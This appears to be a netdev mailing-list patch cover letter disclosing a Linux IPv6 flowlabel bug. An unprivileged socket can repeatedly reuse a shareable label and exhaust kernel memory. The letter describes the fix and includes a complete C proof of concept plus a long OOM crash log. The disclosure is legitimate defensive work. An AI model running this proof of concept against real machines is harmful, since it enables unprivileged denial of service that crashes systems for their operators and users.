Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 35E1935C6AF
	for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 08:41:58 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.48
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787388120; cv=none; b=lPbal1PtLvMTJS9VHPaRhZShrrhDoYs6iC7xL/MYy4MpAS4bnxN9zH2VAyRYngLUHYyd6rm5oKFNe8P3qJsIrThcmKKDfoIevOzie+ky/B/yim+ielIFJFJ5LLeLmqgtxd3rurtbwL4Me4/vt8p9edcW3aGHEiCAqC36uNRZ2vg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787388120; c=relaxed/simple;
	bh=zNkqRFytl9CqJs9mOMuY/X+x6fYDvNgvYkz/m6oROWc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DAylDTy0/33t3ThwTTxm34/fApD6WZhxb7HOf4YQNWP4SJBQ/r4g4RVqycSFbk0Vti3aeKXFNFDbnVii2TmrQ8yKAOf6cc6THEAFDa7YYsLjwMicph9rSbnYcugLv1RojO7nRHyYwaMikecti7NaNm3eCHf3n2i5oPRhbx67zXE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; arc=none smtp.client-ip=209.85.216.48
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-38dc69c74b8so1906300a91.0
        for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 01:41:58 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787388117; x=1787992917;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=eXZcDXKcw7M1JaCrNQmjVAHtxsYCppQ8s1Ub/wCcnL0=;
        b=PUbb/kZH+biipxPvTfqWaUq9borxwWiG95ysg+v1V5Q8UdSRAvrEqiGDie+VGuyfng
         O08gtjjmLP+KV/pIa674jkdzDiG1JEg3R1k4zJHMTKDhbyL62X7wImIfplreA24GgQV5
         JWaJUqJ0T9eoAFr5ytEBuVQ7KcAmir0g4yYmGh+PLIhUa+/o3AclxRQWqV96GGu0UtkH
         OCEyDe1gV5TedaDjuVtxf4TMxtMiw7r4Sa4m5TTMwzQ0dM3Eq7VxVreGK5lQ2F1aKmf5
         vuiK9LNauG5zt455aEl74KT08tXYoHg4iXaDje7h/mP8TBO+CMTIOJhVCpMIUyDHnMNW
         OisA==
X-Forwarded-Encrypted: i=1; AHgh+RpIP5M9SWCxHgVboXXmohZXTwYCLExrKGQPkPgXhK/xFZc8xAOthMktw2UNKP4JN1Tqcdc14VU=@vger.kernel.org
X-Gm-Message-State: AFuF++kKUjXKGVrOdJniKY2BPiG+x/t2Mvf5iCaDtkKNKQdolmv3i/p+
	OPkBL9XA1rft0I4kGWQPcFtR9rutRyaKerdeZ3MULiqsvzdEEQ3esrH8Xb1a4aJ8/ThV
X-Gm-Gg: AR+sD12bGeLmRk/yPCCrATWvKoPGMN9o8F9sUIuuRNZLjxDcnmmTlgiIASGodoUmW0A
	v3Av1zwLzzBdOHfcs7/TwwwaMkDQP/ajJYbkEnoAu7YDxDZDC2XuqZ5nHuy3D5ByKeJZ/STIqLw
	ndkpUCOE3tI30QndimrTWg5TZVzCSsxtlZvmSpe239JxmSehI2SfhJocGDr0eLYC8dbrZmmU95C
	UFW3uQdz7LTuwLd8sN0GAFt712W68SgJqKEyk8VF3ruMGkIP7vTy2WB7/8ygVsadbluNxhq6JAv
	uk4YZVl0a3NYQfJYOI6u7pMWT1vYoKdf5D4fx6L+b1SxubVGITfczJEWHzo9MWF7uj5UZge2LyS
	zi4fu4k0DJuc/0tOfAT/nRB51yEHDVOTc/b1jZIsrBTRccHp6lYP1LMW+K3XRdaTl9sGMnZA/uE
	WlXD/Nttz7uO7k0b4+mc+QOQQdjIYfv9pXe+mdogLfBEk6pA==
X-Received: by 2002:a17:90b:3fc5:b0:38d:eaec:4396 with SMTP id 98e67ed59e1d1-395df5ec7a7mr8123248a91.11.1787388117029;
        Sat, 22 Aug 2026 01:41:57 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:2bd:64ff:feda:6b7b])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-327f909adc8sm4843462eec.2.2026.08.22.01.41.52
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 22 Aug 2026 01:41:55 -0700 (PDT)
From: Zhiling Zou zhilinz@nebusec.ai
To: pabeni@redhat.com,
	netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v3 0/1] ipv6: flowlabel: cap duplicate leases per socket
Date: Sat, 22 Aug 2026 16:41:41 +0800
Message-ID: <cover.1787387550.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/ip6_flowlabel.c. The bug is
reachable by a non-root user without namespace setup.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipv6_flowlabel_get() allocates an ipv6_fl_socklist entry for every
successful GET. When a compatible existing flowlabel is found, the
recheck path links another lease without applying any admission check.

Because reusing a label does not increase fl_size, an unprivileged
socket can repeatedly GET one shareable label and grow its lease list
and the flowlabel user count without bound.

The fix counts every existing lease during the socket-list lookup. Once
an unprivileged socket already holds FL_MAX_PER_SOCK leases in total,
another reuse GET returns ENOBUFS, including reuse of a different
globally interned label. New-label admission remains under the existing
mem_check() policy, and CAP_NET_ADMIN remains unrestricted.

The capability check runs only after the socket reaches the limit,
avoiding capability audit side effects on successful GET requests below
the cap. The admission check runs before updating linger and expires, so
a rejected GET has no renewal side effect, matching the existing
allocation-failure path.

Reproducer:

    gcc -O2 -Wall -Wextra -pthread -o poc poc.c
    echo 2 > /proc/sys/vm/panic_on_oom
    ./poc 4

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/in6.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef IPV6_FLOWLABEL_MGR
#define IPV6_FLOWLABEL_MGR 32
#endif

struct worker_args {
	int id;
	unsigned long long limit;
};

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static int flowlabel_get(int fd, struct in6_flowlabel_req *req)
{
	return setsockopt(fd, IPPROTO_IPV6, IPV6_FLOWLABEL_MGR, req, sizeof(*req));
}

static void init_req(struct in6_flowlabel_req *req)
{
	memset(req, 0, sizeof(*req));
	req->flr_dst = in6addr_loopback;
	req->flr_action = IPV6_FL_A_GET;
	req->flr_share = IPV6_FL_S_ANY;
	req->flr_flags = IPV6_FL_F_CREATE;
	req->flr_expires = 6;
	req->flr_linger = 6;
}

static void *worker(void *opaque)
{
	struct worker_args *args = opaque;
	struct in6_flowlabel_req req;
	unsigned long long i = 0;
	int fd;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket");

	init_req(&req);
	if (flowlabel_get(fd, &req) < 0)
		die("initial flowlabel get");

	fprintf(stderr, "thread=%d label=0x%05x\n", args->id,
		(unsigned int)(ntohl(req.flr_label) & 0xfffff));

	req.flr_flags = 0;
	for (;;) {
		if (flowlabel_get(fd, &req) < 0)
			die("duplicate flowlabel get");

		i++;
		if ((i & ((1ULL << 20) - 1)) == 0)
			fprintf(stderr, "thread=%d duplicates=%llu\n", args->id, i);
		if (args->limit && i >= args->limit)
			break;
	}

	pause();
	return NULL;
}

int main(int argc, char **argv)
{
	struct worker_args *args;
	pthread_t *threads;
	unsigned long long limit = 0;
	int i;
	int nr_threads = 1;

	if (argc > 1)
		nr_threads = atoi(argv[1]);
	if (argc > 2)
		limit = strtoull(argv[2], NULL, 0);

	if (nr_threads <= 0 || nr_threads > 256) {
		fprintf(stderr, "usage: %s [threads 1-256] [duplicate_limit]\n", argv[0]);
		return EXIT_FAILURE;
	}

	signal(SIGPIPE, SIG_IGN);

	threads = calloc(nr_threads, sizeof(*threads));
	args = calloc(nr_threads, sizeof(*args));
	if (!threads || !args)
		die("calloc");

	for (i = 0; i < nr_threads; i++) {
		args[i].id = i;
		args[i].limit = limit;
		if (pthread_create(&threads[i], NULL, worker, &args[i]) != 0) {
			errno = errno ? errno : EINVAL;
			die("pthread_create");
		}
	}

	for (i = 0; i < nr_threads; i++) {
		if (pthread_join(threads[i], NULL) != 0) {
			errno = errno ? errno : EINVAL;
			die("pthread_join");
		}
	}

	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  260.114163][ T9280] poc invoked oom-killer: gfp_mask=0x40cc0(GFP_KERNEL|__GFP_COMP), order=0, oom_score_adj=0
[  260.116323][ T9280] CPU: 1 UID: 1001 PID: 9280 Comm: poc Not tainted 7.1.0-rc2-g6f381f63ccfe-dirty #3 PREEMPT(full)
[  260.116333][ T9280] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  260.116338][ T9280] Call Trace:
[  260.116342][ T9280]  <TASK>
[  260.116344][ T9280]  dump_stack_lvl+0x164/0x1f0
[  260.116430][ T9280]  dump_header+0xf9/0x980
[  260.116440][ T9280]  out_of_memory+0x896/0x1680
[  260.116446][ T9280]  ? __pfx_out_of_memory+0x10/0x10
[  260.116453][ T9280]  __alloc_frozen_pages_noprof+0x2309/0x2b00
[  260.116463][ T9280]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10
[  260.116470][ T9280]  ? __lock_acquire+0x45c/0x25f0
[  260.116491][ T9280]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  260.116498][ T9280]  ? policy_nodemask+0xed/0x4f0
[  260.116506][ T9280]  alloc_pages_mpol+0x1fb/0x540
[  260.116512][ T9280]  ? __pfx_alloc_pages_mpol+0x10/0x10
[  260.116518][ T9280]  ? __lock_acquire+0x45c/0x25f0
[  260.116523][ T9280]  ? unwind_get_return_address+0x59/0xa0
[  260.116532][ T9280]  new_slab+0x458/0x670
[  260.116537][ T9280]  ? find_held_lock+0x2b/0x80
[  260.116542][ T9280]  ___slab_alloc+0x2c4/0x7f0
[  260.116546][ T9280]  ? fl_create+0x104/0xd30
[  260.116554][ T9280]  ? __pcs_replace_empty_main+0x3e3/0x640
[  260.116561][ T9280]  __kmalloc_cache_noprof+0x389/0x6e0
[  260.116566][ T9280]  ? fl_create+0x104/0xd30
[  260.116572][ T9280]  fl_create+0x104/0xd30
[  260.116578][ T9280]  ? do_sock_setsockopt+0xf3/0x1d0
[  260.116585][ T9280]  ? __sys_setsockopt+0x19a/0x230
[  260.116589][ T9280]  ? __x64_sys_setsockopt+0xbd/0x160
[  260.116594][ T9280]  ? do_syscall_64+0x116/0xf80
[  260.116600][ T9280]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  260.116606][ T9280]  ? __pfx_fl_create+0x10/0x10
[  260.116613][ T9280]  ? __lock_acquire+0x45c/0x25f0
[  260.116622][ T9280]  ? find_held_lock+0x2b/0x80
[  260.116626][ T9280]  ? __might_fault+0xbc/0x130
[  260.116633][ T9280]  ? __might_fault+0xbc/0x130
[  260.116638][ T9280]  ipv6_flowlabel_opt+0x50f/0x2d70
[  260.116646][ T9280]  ? __pfx_ipv6_flowlabel_opt+0x10/0x10
[  260.116652][ T9280]  ? __pfx_do_raw_spin_lock+0x10/0x10
[  260.116659][ T9280]  ? __local_bh_enable_ip+0xa2/0x120
[  260.116667][ T9280]  ? do_ipv6_setsockopt+0x1b4a/0x4640
[  260.116673][ T9280]  do_ipv6_setsockopt+0x1b4a/0x4640
[  260.116680][ T9280]  ? __print_lock_name+0x40/0xe0
[  260.116684][ T9280]  ? __pfx_do_ipv6_setsockopt+0x10/0x10
[  260.116689][ T9280]  ? avc_has_perm_noaudit+0x11e/0x3b0
[  260.116716][ T9280]  ? avc_has_perm_noaudit+0x145/0x3b0
[  260.116722][ T9280]  ? avc_has_perm+0x141/0x1f0
[  260.116728][ T9280]  ? __pfx_avc_has_perm+0x10/0x10
[  260.116734][ T9280]  ? find_held_lock+0x2b/0x80
[  260.116738][ T9280]  ? finish_task_switch.isra.0+0x2c3/0x1080
[  260.116747][ T9280]  ? sock_has_perm+0x25a/0x2f0
[  260.116753][ T9280]  ? __pfx_sock_has_perm+0x10/0x10
[  260.116757][ T9280]  ? selinux_netlbl_socket_setsockopt+0x183/0x470
[  260.116764][ T9280]  ? __pfx_selinux_netlbl_socket_setsockopt+0x10/0x10
[  260.116771][ T9280]  ? ipv6_setsockopt+0xcb/0x170
[  260.116776][ T9280]  ipv6_setsockopt+0xcb/0x170
[  260.116782][ T9280]  udpv6_setsockopt+0x64/0xb0
[  260.116787][ T9280]  ? __pfx_sock_common_setsockopt+0x10/0x10
[  260.116794][ T9280]  do_sock_setsockopt+0xf3/0x1d0
[  260.116801][ T9280]  __sys_setsockopt+0x19a/0x230
[  260.116808][ T9280]  __x64_sys_setsockopt+0xbd/0x160
[  260.116813][ T9280]  ? do_syscall_64+0x90/0xf80
[  260.116818][ T9280]  ? lockdep_hardirqs_on+0x7b/0x110
[  260.116823][ T9280]  do_syscall_64+0x116/0xf80
[  260.116829][ T9280]  ? clear_bhb_loop+0x40/0x90
[  260.116835][ T9280]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  260.116841][ T9280] RIP: 0033:0x4218ce
[  260.116847][ T9280] Code: bc c5 c1 e0 1a 0d 00 00 04 00 89 01 e9 c1 fe ff ff e8 76 01 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
[  260.116875][ T9280] RSP: 002b:00007fb2b56d01e8 EFLAGS: 00000286 ORIG_RAX: 0000000000000036
[  260.116887][ T9280] RAX: ffffffffffffffda RBX: 00000000000e4359 RCX: 00000000004218ce
[  260.116890][ T9280] RDX: 0000000000000020 RSI: 0000000000000029 RDI: 0000000000000006
[  260.116893][ T9280] RBP: 000000000968d9a0 R08: 0000000000000020 R09: 0000000000000000
[  260.116896][ T9280] R10: 00007fb2b56d01f0 R11: 0000000000000286 R12: 0000000000000006
[  260.116899][ T9280] R13: 00007fb2b56d01f0 R14: 0000000000499075 R15: 00007fff06d5a7d0
[  260.116905][ T9280]  </TASK>
[  260.116907][ T9280] Mem-Info:
[  260.293627][ T9280] active_anon:4299 inactive_anon:4857 isolated_anon:219
[  260.293627][ T9280]  active_file:137 inactive_file:432 isolated_file:0
[  260.293627][ T9280]  unevictable:1757 dirty:0 writeback:0
[  260.293627][ T9280]  slab_reclaimable:5632 slab_unreclaimable:238045
[  260.293627][ T9280]  mapped:69 shmem:2715 pagetables:560
[  260.293627][ T9280]  sec_pagetables:0 bounce:0
[  260.293627][ T9280]  kernel_misc_reclaimable:0
[  260.293627][ T9280]  free:14850 free_pcp:158 free_cma:0
[  260.310299][ T9280] Node 0 active_anon:17280kB inactive_anon:19428kB active_file:968kB inactive_file:1728kB unevictable:7028kB isolated(anon):624kB isolated(file):0kB mapped:360kB dirty:0kB writeback:0kB shmem:10860kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9312kB pagetables:2240kB sec_pagetables:0kB all_unreclaimable? yes Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[  260.337132][ T9280] Node 0 DMA free:5704kB boost:0kB min:532kB low:664kB high:796kB reserved_highatomic:0KB free_highatomic:0KB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:244kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[  260.366962][ T9280] lowmem_reserve[]: 0 1275 1275 1275 1275
[  260.367819][ T9280] Node 0 DMA32 free:52848kB boost:8192kB min:52712kB low:63840kB high:74968kB reserved_highatomic:0KB free_highatomic:0KB active_anon:18036kB inactive_anon:19260kB active_file:2480kB inactive_file:1048kB unevictable:7028kB writepending:0kB zspages:0kB present:2080640kB managed:1305728kB mlocked:0kB bounce:0kB free_pcp:592kB local_pcp:428kB free_cma:0kB
[  260.394848][ T9280] lowmem_reserve[]: 0 0 0 0 0
[  260.395449][ T9280] Node 0 DMA: 1*4kB (U) 6*8kB (U) 5*16kB (U) 4*32kB (UM) 2*64kB (UM) 1*128kB (M) 0*256kB 2*512kB (UM) 2*1024kB (UM) 1*2048kB (U) 0*4096kB = 5636kB
[  260.402961][ T9280] Node 0 DMA32: 415*4kB (ME) 288*8kB (ME) 187*16kB (ME) 138*32kB (UME) 73*64kB (UME) 58*128kB (UME) 22*256kB (UME) 14*512kB (UME) 2*1024kB (M) 3*2048kB (M) 2*4096kB (M) = 52652kB
[  260.411359][ T9280] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[  260.412684][ T9280] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[  260.422944][ T9280] 3181 total pagecache pages
[  260.423573][ T9280] 0 pages in swap cache
[  260.424132][ T9280] Free swap  = 0kB
[  260.429228][ T9280] Total swap = 0kB
[  260.429831][ T9280] 524158 pages RAM
[  260.430270][ T9280] 0 pages HighMem/MovableOnly
[  260.435421][ T9280] 193886 pages reserved
[  260.436369][ T9280] 0 pages cma reserved
[  260.447576][ T9280] Unreclaimable slab info:
[  260.448598][ T9280] Name                      Used          Total
[  260.460632][ T9280] bio-464                    1KB         15KB
[  260.481536][ T9280] bio-528                    3KB         15KB
[  260.495366][ T9280] bio-544                    1KB         15KB
[  260.496240][ T9280] bio-552                    1KB         15KB
[  260.512532][ T9280] TIPC                       1KB         31KB
[  260.524576][ T9280] SCTPv6                     2KB         30KB
[  260.525433][ T9280] RXRPC                      2KB         30KB
[  260.534107][ T9280] rxrpc_call_jar            19KB         62KB
[  260.553196][ T9280] fib6_node                  2KB          4KB
[  260.554042][ T9280] ip6_dst_cache              1KB          7KB
[  260.563372][ T9280] RAWv6                     17KB         30KB
[  260.564924][ T9280] UDPv6                     11KB         61KB
[  260.569716][ T9280] TCPv6                     10KB         31KB
[  260.571016][ T9280] t10_alua_lu_gp_cache          0KB          7KB
[  260.580186][ T9280] scsi_sense_cache           2KB          3KB
[  260.586086][ T9280] virtio_scsi_cmd           24KB         31KB
[  260.591434][ T9280] bio-136                   45KB         48KB
[  260.592420][ T9280] bio-264                    1KB          7KB
[  260.596561][ T9280] mqueue_inode_cache          1KB         30KB
[  260.604287][ T9280] f2fs_bio_post_read_ctx         28KB         31KB
[  260.609999][ T9280] jfs_mp                     9KB         11KB
[  260.611025][ T9280] cifs_small_rq             18KB         22KB
[  260.616364][ T9280] cifs_request              67KB         67KB
[  260.621772][ T9280] cifs_mpx_ids               1KB          7KB
[  260.629231][ T9280] cifs_io_subrequest         50KB         56KB
[  260.630268][ T9280] cifs_io_request          100KB        112KB
[  260.636659][ T9280] nfs_commit_data            3KB         15KB
[  260.653306][ T9280] nfs_write_data            38KB         46KB
[  260.654362][ T9280] jbd2_inode                 2KB          3KB
[  260.673085][ T9280] ext4_system_zone           1KB         11KB
[  260.674510][ T9280] ext4_io_end_vec            0KB          3KB
[  260.680643][ T9280] fasync_cache               0KB          3KB
[  260.686736][ T9280] kvm_gmem_inode_cache          1KB         15KB
[  260.691120][ T9280] rpc_buffers               18KB         31KB
[  260.698807][ T9280] rpc_tasks                  3KB          7KB
[  260.704566][ T9280] UNIX-STREAM               42KB        220KB
[  260.705567][ T9280] UNIX                      36KB         94KB
[  260.712137][ T9280] tcp_bind2_bucket           1KB          4KB
[  260.715661][ T9280] tcp_bind_bucket            0KB          4KB
[  260.724068][ T9280] ip_fib_trie                1KB          3KB
[  260.725260][ T9280] ip_fib_alias               1KB          3KB
[  260.732443][ T9280] rtable                     1KB         31KB
[  260.739579][ T9280] RAW                       12KB         32KB
[  260.744301][ T9280] UDP                        4KB         31KB
[  260.749433][ T9280] request_sock_TCP           0KB          7KB
[  260.757352][ T9280] TCP                       10KB         60KB
[  260.760139][ T9280] fs_bio_integrity           0KB          4KB
[  260.767195][ T9280] hugetlbfs_inode_cache          3KB         15KB
[  260.768482][ T9280] netfs_subrequest          37KB         39KB
[  260.780312][ T9280] netfs_request            100KB        112KB
[  260.789775][ T9280] bio-280                   16KB         16KB
[  260.790819][ T9280] ep_head                    5KB         16KB
[  260.798972][ T9280] eventpoll_pwq              9KB         27KB
[  260.810600][ T9280] eventpoll_epi             16KB         45KB
[  260.818663][ T9280] inotify_inode_mark         27KB         31KB
[  260.830302][ T9280] sgpool-128               148KB        153KB
[  260.831411][ T9280] sgpool-64                 81KB         94KB
[  260.842260][ T9280] sgpool-32                 33KB         45KB
[  260.846336][ T9280] sgpool-16                 17KB         47KB
[  260.854460][ T9280] sgpool-8                  15KB         31KB
[  260.855397][ T9280] bio_crypt_ctx             18KB         19KB
[  260.862430][ T9280] bio_integrity_data          0KB          7KB
[  260.870571][ T9280] request_queue            161KB        182KB
[  260.871872][ T9280] blkdev_ioc                 0KB          7KB
[  260.885183][ T9280] bio-200                   71KB         78KB
[  260.898848][ T9280] biovec-max               328KB        367KB
[  260.899757][ T9280] biovec-128                36KB         63KB
[  260.910122][ T9280] biovec-64                 72KB         75KB
[  260.921915][ T9280] biovec-16                 14KB         23KB
[  260.928228][ T9280] uid_cache                  0KB          7KB
[  260.934696][ T9280] dmaengine-unmap-256          2KB         31KB
[  260.944161][ T9280] dmaengine-unmap-128          1KB         15KB
[  260.952676][ T9280] dmaengine-unmap-16          0KB          7KB
[  260.962559][ T9280] dmaengine-unmap-2          0KB          4KB
[  260.969868][ T9280] QIPCRTR                    1KB         30KB
[  260.979392][ T9280] audit_buffer               0KB          3KB
[  260.987460][ T9280] skbuff_small_head         21KB         63KB
[  260.995595][ T9280] skbuff_fclone_cache          0KB         63KB
[  260.996848][ T9280] skbuff_head_cache         21KB         78KB
[  261.006400][ T9280] configfs_dir_cache          4KB          7KB
[  261.007444][ T9280] file_lock_cache            0KB         30KB
[  261.016958][ T9280] file_lock_ctx             16KB         19KB
[  261.025714][ T9280] fsnotify_inode_mark_connector         21KB         22KB
[  261.032200][ T9280] taskstats                  1KB         15KB
[  261.040754][ T9280] mem_cgroup_per_node         59KB         91KB
[  261.042018][ T9280] mem_cgroup                94KB        126KB
[  261.052816][ T9280] proc_dir_entry           311KB        347KB
[  261.056063][ T9280] seq_file                   0KB         15KB
[  261.062996][ T9280] sigqueue                   0KB         11KB
[  261.064059][ T9280] shmem_inode_cache       8424KB       8509KB
[  261.073260][ T9280] kernfs_iattrs_cache        210KB        225KB
[  261.074257][ T9280] kernfs_node_cache      21226KB      21321KB
[  261.085409][ T9280] mnt_cache                 53KB         78KB
[  261.097920][ T9280] filp                     253KB        850KB
[  261.098743][ T9280] names_cache                0KB         31KB
[  261.106620][ T9280] net_namespace              9KB         29KB
[  261.107839][ T9280] ima_iint_cache            62KB        115KB
[  261.118440][ T9280] hashtab_node             927KB        928KB
[  261.128964][ T9280] ebitmap_node            2104KB       2126KB
[  261.130061][ T9280] avtab_node             16916KB      16917KB
[  261.139207][ T9280] avc_node                  89KB        134KB
[  261.140175][ T9280] lsm_inode_cache         3781KB       4595KB
[  261.147783][ T9280] lsm_file_cache            66KB        243KB
[  261.148581][ T9280] key_jar                   24KB         32KB
[  261.157045][ T9280] uts_namespace              0KB         15KB
[  261.157875][ T9280] nsproxy                    0KB          3KB
[  261.164685][ T9280] vm_area_struct          1085KB       2086KB
[  261.165777][ T9280] fs_cache                   7KB         31KB
[  261.174293][ T9280] files_cache               22KB         79KB
[  261.175257][ T9280] signal_cache             526KB       1785KB
[  261.186472][ T9280] sighand_cache            667KB       2037KB
[  261.196071][ T9280] task_struct             2273KB       4406KB
[  261.197362][ T9280] cred                     127KB        567KB
[  261.206991][ T9280] anon_vma_chain           321KB        574KB
[  261.208044][ T9280] anon_vma                 288KB        465KB
[  261.213781][ T9280] pid                      126KB        441KB
[  261.214599][ T9280] Acpi-Operand              76KB        158KB
[  261.220338][ T9280] Acpi-ParseExt              0KB         15KB
[  261.221073][ T9280] Acpi-Parse                 0KB         15KB
[  261.225952][ T9280] Acpi-State                 0KB         15KB
[  261.226936][ T9280] Acpi-Namespace            55KB         62KB
[  261.235942][ T9280] numa_policy                0KB          3KB
[  261.240125][ T9280] perf_event                 0KB         31KB
[  261.241428][ T9280] trace_event_file         874KB        876KB
[  261.246030][ T9280] ftrace_event_field       1969KB       1972KB
[  261.251628][ T9280] pool_workqueue           754KB        787KB
[  261.254973][ T9280] maple_node               670KB       2457KB
[  261.264769][ T9280] mm_struct                 65KB        187KB
[  261.272749][ T9280] vmap_area                930KB        936KB
[  261.276921][ T9280] debug_objects_cache       2763KB       3221KB
[  261.288741][ T9280] page->ptl                 48KB        130KB
[  261.290051][ T9280] kmalloc-cg-8k            168KB        192KB
[  261.298945][ T9280] kmalloc-cg-4k           1080KB       1152KB
[  261.299804][ T9280] kmalloc-cg-2k           1356KB       1500KB
[  261.310383][ T9280] kmalloc-cg-1k            204KB        330KB
[  261.319402][ T9280] kmalloc-cg-512           108KB        283KB
[  261.324394][ T9280] kmalloc-cg-256            57KB         78KB
[  261.329031][ T9280] kmalloc-cg-128            35KB         55KB
[  261.330364][ T9280] kmalloc-cg-64             94KB        344KB
[  261.338237][ T9280] kmalloc-cg-32           1266KB       1299KB
[  261.339073][ T9280] kmalloc-cg-16              6KB         15KB
[  261.344055][ T9280] kmalloc-cg-8              12KB         23KB
[  261.353878][ T9280] kmalloc-cg-192            22KB         47KB
[  261.361414][ T9280] kmalloc-cg-96           1684KB       1712KB
[  261.372756][ T9280] kmalloc-8k              2400KB       2568KB
[  261.375232][ T9280] kmalloc-4k              3936KB       6168KB
[  261.382562][ T9280] kmalloc-2k             13098KB      13470KB
[  261.383939][ T9280] kmalloc-1k             24330KB      24720KB
[  261.395436][ T9280] kmalloc-512            16783KB      17419KB
[  261.396429][ T9280] kmalloc-256             4850KB       4851KB
[  261.402725][ T9280] kmalloc-128            37486KB      40150KB
[  261.406469][ T9280] kmalloc-64              5589KB       5956KB
[  261.409839][ T9280] kmalloc-32            709883KB     709884KB
[  261.410848][ T9280] kmalloc-16              2808KB       2851KB
[  261.416940][ T9280] kmalloc-8               1699KB       1752KB
[  261.417933][ T9280] kmalloc-192             1387KB       1740KB
[  261.422648][ T9280] kmalloc-96              2370KB       2540KB
[  261.428794][ T9280] kmem_cache_node          179KB        180KB
[  261.435368][ T9280] kmem_cache               214KB        220KB
[  261.442984][ T9280] Memory cgroup min protection 0kB -- low protection 0kB
[  261.442995][ T9280] Tasks state (memory values in pages):
[  261.452779][ T9280] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[  261.460339][ T9280] [   4982]     0  4982    10047      229      226        2         1    94208        0          -250 systemd-journal
[  261.468413][ T9280] [   4995]     0  4995     9313     2938     2936        2         0    98304        0         -1000 systemd-udevd
[  261.472913][ T9280] [   8767]     0  8767     1411       70       68        2         0    49152        0             0 cron
[  261.478782][ T9280] [   8807]     0  8807    55235      378      375        3         0    77824        0             0 rsyslogd
[  261.480677][ T9280] [   9092]     0  9092    24967      353      351        2         0    73728        0             0 dhclient
[  261.482292][ T9280] [   9125]     0  9125     3336      244      242        2         0    65536        0         -1000 sshd
[  261.487220][ T9280] [   9126]     0  9126      720       35       33        2         0    45056        0             0 agetty
[  261.488607][ T9280] [   9127]     0  9127      720       34       32        2         0    40960        0             0 agetty
[  261.492648][ T9280] [   9128]     0  9128      720       35       33        2         0    45056        0             0 agetty
[  261.496824][ T9280] [   9129]     0  9129      720       34       32        2         0    53248        0             0 agetty
[  261.500751][ T9280] [   9131]     0  9131      720       34       32        2         0    49152        0             0 agetty
[  261.504507][ T9280] [   9132]     0  9132      720       34       32        2         0    45056        0             0 agetty
[  261.510431][ T9280] [   9133]     0  9133     1101       37       35        2         0    49152        0             0 agetty
[  261.527985][ T9280] [   9136]     0  9136    14097      390      389        1         0    90112        0             0 nginx
[  261.536055][ T9280] [   9137]    33  9137    14190      471      469        2         0    90112        0             0 nginx
